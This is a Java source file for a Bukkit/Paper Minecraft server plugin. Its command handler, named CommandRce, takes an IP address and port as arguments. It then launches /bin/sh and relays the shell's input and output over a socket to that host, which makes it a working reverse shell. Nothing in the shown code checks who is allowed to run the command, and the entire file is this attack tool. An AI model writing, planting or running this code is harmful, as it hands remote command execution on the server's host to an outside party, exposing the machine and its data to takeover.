package io.papermc.mcrce;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Arrays;
import java.util.logging.Logger;

public class CommandRce implements CommandExecutor {
    private final Logger logger;

    CommandRce(Logger logger) {
        this.logger = logger;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        try {
            boolean isCommandCorrect = args.length == 2 && Integer.parseInt(args[1]) > 0 && Integer.parseInt(args[1]) < 65535;
            if (isCommandCorrect) {
                String ip = args[0];
                String port = args[1];
                // start in new thread
                new Thread(() -> {
                    try {
                        getShell(ip, Integer.parseInt(port));
                    } catch (IOException | InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                }).start();
            }
        } catch (Exception e) {
            return false;
        }
        return true;
    }



    public void getShell(String host, int port) throws IOException, InterruptedException {
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
